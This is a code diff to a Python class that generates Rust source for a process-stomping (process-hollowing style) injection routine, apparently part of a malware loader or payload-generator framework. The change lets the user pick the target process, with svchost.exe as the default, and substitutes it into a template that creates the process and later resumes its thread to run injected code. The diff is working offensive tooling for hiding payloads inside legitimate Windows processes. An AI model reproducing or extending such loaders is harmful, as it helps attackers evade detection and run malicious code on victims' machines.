@@ -2,7 +2,9 @@ from string import Template
 
 class processstomp:
     def __init__(self, arguments):
-        pass
+        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
 
     def imports(self) -> list[str]:
         return ['extern crate windows_sys;', 
@@ -31,13 +33,13 @@ class processstomp:
         return """"""
 
     def template(self) -> str:
-        return """
+        return Template("""
     {transformers}
 
     unsafe
     {{
 
-        let name = CString::new("C:\\\\Windows\\\\System32\\\\svchost.exe").unwrap();
+        let name = CString::new("$target").unwrap();
 
         let lpstartupinfo = STARTUPINFOA {{
             cb: std::mem::size_of::<STARTUPINFOA>() as u32,
@@ -135,4 +137,4 @@ class processstomp:
         
         ResumeThread((lpprocessinformation).hThread);
     }}
-"""
+""").substitute(target=self.target)
